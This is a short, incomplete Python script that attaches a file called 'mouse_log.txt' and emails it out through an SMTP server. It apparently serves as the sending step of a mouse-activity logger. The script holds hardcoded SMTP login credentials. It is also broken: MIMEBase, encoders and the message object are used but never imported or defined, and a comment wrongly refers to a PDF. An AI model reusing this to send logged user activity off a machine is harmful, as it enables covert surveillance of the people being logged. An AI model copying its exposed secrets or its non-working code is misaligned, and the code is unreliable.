import smtplib




sender = "#Example#"
receiver = "#Example#"

filename = "mouse_log.txt"
# Open PDF file in binary mode

# We assume that the file is in the directory where you run your Python script from
with open(filename, "rb") as attachment:
    # The content type "application/octet-stream" means that a MIME attachment is a binary file
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())

# Encode to base64
encoders.encode_base64(part)

# Add header
part.add_header(
    "Content-Disposition",
    f"attachment; filename= {filename}",
)

# Add attachment to your message and convert it to string

message.attach(part)
text = message.as_string()

with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
    server.login("ab749b7641c659", "7d6ebc403f5e8b")
    server.sendmail(sender, receiver, text)

print('Sent')
